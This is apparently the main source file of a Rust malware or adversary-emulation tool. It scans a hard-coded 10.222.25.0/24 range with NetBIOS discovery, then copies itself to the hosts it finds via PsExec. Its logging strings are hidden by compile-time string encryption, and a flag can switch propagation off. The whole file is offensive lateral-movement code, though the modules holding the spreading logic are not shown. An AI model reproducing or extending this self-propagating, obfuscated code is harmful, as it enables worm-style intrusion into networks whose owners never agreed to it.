mod latmove;
mod logger;
mod psexec;
mod proc;

use std::process::exit;
use clap::{Parser};
use logger::{log_error, log_info};
use crate::latmove::propagate::{find_local_targets, propagate_via_psexec};
use encryptliterals::{setup_string_literal_encryption, esl};

use {
    logger::config_logger,
    simplelog::{SimpleLogger, LevelFilter, Config}
};

const GLOBAL_THREAD_POOL_SIZE: usize = 12;

/// Definitions for all command line arguments
#[derive(Parser, Debug)]
struct Args {
    #[arg(long)]
    no_prop: bool, // Disable network scanning and propagation via psexec
}

setup_string_literal_encryption!();

fn get_strict_include_targets() -> Vec<String> {
    return vec![
        String::from(esl!("10.222.25.62")),
    ];
}

fn get_strict_include_scan_ranges() -> Vec<String> {
    return vec![
        String::from(esl!("10.222.25.0/24")),
    ];
}


fn main() {
    // INITIAL SETUP

    // Parse command line arguments
    let args = Args::parse();
    
    // Log events to a file and stderr
    let logger = config_logger();
    match logger {
        Ok(_) => logger::log_info(String::from(esl!("Logger setup successful"))),
        Err(e) => {
            let _ = SimpleLogger::init(LevelFilter::Info, Config::default());
            log_error(format!("{}: {}", esl!("Logger setup failed"), e));
            exit(1);
        }
    }

    // Set up threadpool
    match rayon::ThreadPoolBuilder::new()
        .num_threads(GLOBAL_THREAD_POOL_SIZE)
        .build_global() {
        Ok(_) => {},
        Err(e) => {
            log_error(format!("{}: {}", esl!("Failed to configure global thread pool for network discovery: "), e));
            exit(3);
        }
    }

    // PROPAGATION

    // Find other hosts to propagate to
    if !args.no_prop {
        // NetBios discovery
        log_info(String::from(esl!("Performing NetBIOS network discovery to find remote hosts.")));
        let local_targets = match find_local_targets(&get_strict_include_targets(), &get_strict_include_scan_ranges()) {
            Ok(s) => {
                log_info(format!("{}: {:?}", esl!("Found local targets"), s));
                s
            }
            Err(e) => {
                log_error(format!("{}: {}", esl!("Finding local targets failed"), e));
                Vec::new()
            }
        };

        // Propagate to discovered hosts via PsExec
        log_info(String::from(esl!("Performing PsExec propagation.")));
        match propagate_via_psexec(&local_targets) {
            Ok(_) => log_info(String::from(esl!("Propagation complete"))),
            Err(e) => {
                log_error(format!("{}: {}", esl!("Propagation failed"), e));
            }
        }
    } else {
        log_info(String::from(esl!("Skipping network discovery.")));
    }

    log_info(String::from(esl!("Finished.")));
}
